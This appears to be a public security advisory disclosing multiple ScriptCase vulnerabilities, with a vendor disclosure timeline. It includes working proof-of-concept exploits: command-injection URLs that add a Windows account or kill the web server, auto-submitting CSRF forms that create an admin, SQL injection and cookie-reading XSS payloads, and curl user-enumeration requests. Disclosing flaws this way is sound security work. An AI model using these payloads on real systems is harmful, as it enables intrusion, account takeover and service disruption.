@@ -1,0 +1,382 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source: http://hyp3rlinx.altervista.org/advisories/SCRIPTCASE-PHP-WEB-TOOL-MULTIPLE-VULNERABILITIES.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+==================
+www.scriptcase.net
+
+
+
+Product:
+===================
+ScriptCase
+v8.1.053, v8.1.051, v8.1.43.0
+
+scriptcase_install_en_us_v8.1.053.exe
+hash: ceaba1fce05556b82ab37582a7c907f4
+
+scriptcase_install_en_us_v8.1.051.exe
+hash: c3c9fbe085ab5462304c0c73c8698946
+
+
+ScriptCase RAD is a development platform for PHP applications, is web
+oriented and can be installed in a server in the internet.
+
+
+
+Vulnerability Type:
+=============================
+CSRF Remote Command Execution
+CSRF Add Admin
+SQL Injection
+Cross Site Scripting
+Local Privlege Escalation (Insecure File Permissions)
+User Enumeration / Token Bypass
+
+Downloaded latest version v8.1.053, and still vulnerable.
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+[CSRF Remote Command Execution]
+Scriptcase has a remote command execution ailment via CSRF, if an
+authenticated user clicks an attacker link etc. This can allow attackers
+to run arbitrary system commands on the affected host and do things like
+add accounts etc.
+
+Scriptcase PHP code uses encryption / obfuscated so its not easy testing
+but we can see here the error returned for PHP eval()'d code
+when injecting an Array [] brackets or something as paremeter.
+
+Parse error: syntax error, unexpected end of file, expecting ']' in C:\Program Files (x86)\NetMake\v81\wwwroot\scriptcase\devel\lib\php\functions2.inc.php(358) : eval()'d code on line 1
+
+After trying to wrap a Windows system call in backtick "`" operators it
+worked perfectly. This allowed me to add an arbitrary system
+account to the affected system.
+
+
+
+[CSRF]
+There are several cross site request forgery vectors, allowing attackers to
+add an Admin account to Scriptcase application etc.
+
+
+[Cross Site Scripting]
+Multiple XSS entry points exists within the vulnerable application both GET
+and POST.
+
+Example XSS vulnerable scriptcase code 'ajax_cod_apls' is not santized
+before being processed by ajax HTTP post request.
+
+$.ajax({
+type: 'POST',
+url: '/scriptcase/devel/iface/generate.php',
+data:
+'compile_app_ajax=S&gen_option=console&targ_frame=_self&console=yes&ajax_cod_apls='
++ str_open_apps,
+success: function(s_result){
+a_result = s_result.split('__compile_ajax_sep_row__');
+nm_compile_gerar();
+}
+});
+
+
+
+[Local Privilege Escalation]
+scriptcase uses weak insecure file permissions as the “Everyone” group has
+full access on it. Allowing low privileged users to
+execute arbitrary code in the security context of ANY other users with
+elevated privileges on the affected system.
+
+"Everyone" encompasses all users who have logged in with a password as well
+as built-in, non-password protected accounts such as Guest
+and LOCAL_SERVICE.Any user (even guest) will be able to replace, modify or
+change the file. This would allow an attacker the ability
+to inject code or replace scriptcase used executables and have it run in
+the context of the system.
+
+
+
+[User Enumeration]
+On failed scriptcase login the application returns one of the following in
+the HTTP response.
+
+"The login name provided is not registered on the system."
+On a failed password but correct user name entered application HTTP
+response returns.
+"The password is incorrect."
+
+
+
+
+Exploit code(s):
+===============
+
+[CSRF Remote Command Execution]
+
+Note: we NEED to use backtick operators "`"
+
+http://127.0.0.1:8081/scriptcase/devel/iface/popup_sql_script.php?sql_script=`start net user EVIL abc123 /add`
+
+Verify...
+
+c:\> net user
+
+User accounts for \\hyp3rlinx
+------------------------------------------------------------------------
+Administrator hyp3rlinx Guest
+EVIL Test Privileged-User
+
+
+2) start Windows 'calc.exe'
+http://127.0.0.1:8081/scriptcase/devel/iface/popup_sql_script.php?sql_script=`calc.exe`
+
+OR
+
+http://127.0.0.1:8081/scriptcase/devel/iface/popup_sql_script.php?sql_script=`start
+calc.exe`
+
+**sometimes "calc.exe" doesnt appear but it is running use "tasklist /v |
+findstr calc.exe" to verify it is in fact running.
+
+
+4) Apache DOS (needs httpd environmental variable set)
+http://127.0.0.1:8081/scriptcase/devel/iface/popup_sql_script.php?sql_script=`taskkill /f /im httpd.exe`
+
+
+
+[SQL Injection]
+
+AND boolean-based blind - WHERE or HAVING clause in 'nrLinhas' parameter "10 AND 2=2"
+
+<form action="http://127.0.0.1:8081/scriptcase/devel/iface/admin_user.php" method="post">
+<input type="hidden" name="nOpc" value="1">
+<input type="hidden" name="nOpr" value="0">
+<input type="hidden" name="nColOrd" value="1">
+<input type="hidden" name="nLogin" value="">
+<input type="hidden" name="nFiltro" value="2">
+<input type="hidden" name="filtroTipo" value="2">
+<input type="hidden" name="filtroTexto" value="1">
+<input type="hidden" name="nrLinhas" value="10 AND 2=2">
+<input type="hidden" name="nrInicio" value="0">
+<input type="hidden" name="maxReg" value="1">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+[CSRF Add Admin]
+
+<form name="form_user" action=" http://127.0.0.1:8081/scriptcase/devel/iface/admin_user.php" method="POST">
+<input type="hidden" name="nOpc" value="2">
+<input type="hidden" name="nOpr" value="2">
+<input type="hidden" name="nLogin" value="hyp3rlinx">
+<input type="hidden" name="nMail" value="pwn@Done.com">
+<input type="hidden" name="nPass[]" value="abc123">
+<input type="text" name="nPass[]" value="abc123"/>
+<input type="text" name="privBox%5B%5D" value="Priv_Admin" />
+<input type="hidden" name="privBox%5B%5D" value="Priv_Proj" />
+<input type="hidden" name="privBox%5B%5D" value="Priv_DataDictionary" />
+<input type="hidden" name="privBox%5B%5D" value="Priv_Exec">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Export">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Library">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Reports">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Locales">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Publish">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Aba">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Blank">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Calendar">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Chart">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Cons">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Container">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Ctrl">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Filt">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Edit">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Menu">
+<input type="hidden" name="privBox%5B%5D" value="Priv_ReportPdf">
+<input type="hidden" name="privBox%5B%5D" value="Priv_DbManager">
+<input type="hidden" name="privBox%5B%5D" value="Priv_DbConvert">
+<input type="hidden" name="privBox%5B%5D" value="Priv_SQLBuilder">
+<input type="hidden" name="privBox%5B%5D" value="Priv_Connection">
+<input type="hidden" name="hidden" value="New User">
+<script> document.forms[0].submit()</script>
+</form>
+
+
+[CSRF mysql connect creation wizard]
+
+<form action="
+http://127.0.0.1:8081/scriptcase/devel/iface/admin_sys_allconections_create_wizard.php" method="post">
+<input type="hidden" name="ajax" value="S"/>
+<input type="hidden" name="set_charset" value="S"/>
+<input type="hidden" name="dbms" value="mysql"/>
+<input type="hidden" name="sgdb" value="pdo_mysql"/>
+<input type="hidden" name="exit" value="S"/>
+<input type="hidden" name="host" value="127__DOT__0__DOT__0__DOT__1:3306"/>
+<input type="hidden" name="usr" value="root"/>
+<input type="hidden" name="pwd" value=""/>
+<input type="hidden" name="db" value="mysql"/>
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+[Cross Site Scripting] - Successful in Firefox
+
+XSS 1)
+
+http://127.0.0.1:8081/scriptcase/devel/iface/app_import.php?option=%22/%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+
+XSS 2)
+
+http://127.0.0.1:8081/scriptcase/devel/iface/popup_sql_script.php?sql_script=%22/%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+
+XSS 3)
+
+<form action="http://127.0.0.1:8081/scriptcase/devel/iface/generate.php"
+method="post">
+<input type="hidden" name="compile_app_ajax" value="S"/>
+<input type="hidden" name="gen_option" value="console"/>
+<input type="hidden" name="targ_frame" value="_self"/>
+<input type="hidden" name="console" value="yes"/>
+<input type="hidden" name="ajax_cod_apls"
+value="<script>alert(document.cookie)</script>"/>
+<script>document.forms[0].submit()</script>
+</form>
+
+
+XSS 4)
+
+<form action="http://127.0.0.1:8081/scriptcase/devel/iface/admin_user.php"
+method="post">
+<input type="hidden" name="nOpc" value="1">
+<input type="hidden" name="nOpr" value="0">
+<input type="hidden" name="nColOrd" value="1">
+<input type="hidden" name="nLogin" value="">
+<input type="hidden" name="nFiltro" value="2">
+<input type="hidden" name="filtroTipo" value="2">
+<input type="hidden" name="filtroTexto"
+value='"/><script>alert(document.cookie)</script>'>
+<input type="hidden" name="nrLinhas" value="10">
+<input type="hidden" name="nrInicio" value="0">
+<input type="hidden" name="maxReg" value="1">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+[Local Privilege Escalations]
+
+Proof.
+
+C:\Program Files (x86)\NetMake\v81\components>cacls * | findstr Everyone |
+more
+C:\Program Files (x86)\NetMake\v81\components\apache Everyone:(ID)F
+
+Everyone:(OI)(CI)(IO)(ID)
+C:\Program Files (x86)\NetMake\v81\components\msodbcsql_x64.msi
+Everyone:(ID)F
+C:\Program Files (x86)\NetMake\v81\components\msodbcsql_x86.msi
+Everyone:(ID)F
+C:\Program Files (x86)\NetMake\v81\components\php Everyone:(ID)F
+Everyone:(OI)(CI)(IO)(ID)F
+
+
+C:\Program Files (x86)\NetMake\v81\wwwroot>cacls * | findstr Everyone | more
+C:\Program Files (x86)\NetMake\v81\wwwroot\favicon.ico Everyone:(ID)F
+C:\Program Files (x86)\NetMake\v81\wwwroot\index.php Everyone:(ID)F
+C:\Program Files (x86)\NetMake\v81\wwwroot\robots.txt Everyone:(ID)F
+C:\Program Files (x86)\NetMake\v81\wwwroot\scriptcase Everyone:(ID)F
+
+Everyone:(OI)(CI)(IO)(ID)F
+
+
+
+[User Account Enumeration / Token Bypass]
+
+First off the stupid token used on the login FORM e.g. "form_login=<TOKEN>"
+is totally useless you can put anything you like in it
+and the application will happily process the request.
+
+
+CURL Enumeration 1)
+curl -i -v -X POST
+http://127.0.0.1:8081/scriptcase/devel/iface/login.php?rand= -d
+field_user=BOZO -d field_pass=1 -d ajax=nm -d option=login -d
+form_login=STUPID-TOKEN -d language=en_US
+
+HTTP Response:
+"error1:The login name provided is not registered on the system."
+
+CURL Enumeration 2)
+curl -i -v -X POST
+http://127.0.0.1:8081/scriptcase/devel/iface/login.php?rand= -d
+field_user=admin -d field_pass=1 -d ajax=nm -d option=login -d
+form_login=STUPID-TOKEN -d language=en_US
+
+HTTP Response:
+"error1:The password is incorrect."
+
+Either way we know when we hit a valid account.
+
+
+
+Disclosure Timeline:
+=========================================
+Vendor Notification: October 13, 2016
+Vendor acknowledgement: October 14, 2016
+Vendor request POC video: October 14, 2016
+Sent vendor video link: October 14, 2016
+Request update from vendor: October 17, 2016
+Vendor reply: "under review"
+Vendor requests video again: October 25, 2016
+Request update from vendor: October 30, 2016
+Vendor reply: "No information"
+Request ETA: November 7, 2016
+Request status: November 14, 2016
+Vendor Unresponsive No More Replies
+November 20, 2016 : Public Disclosure
+
+
+
+Exploitation Technique:
+=======================
+Remote / Local
+
+
+
+Severity Level:
+================
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
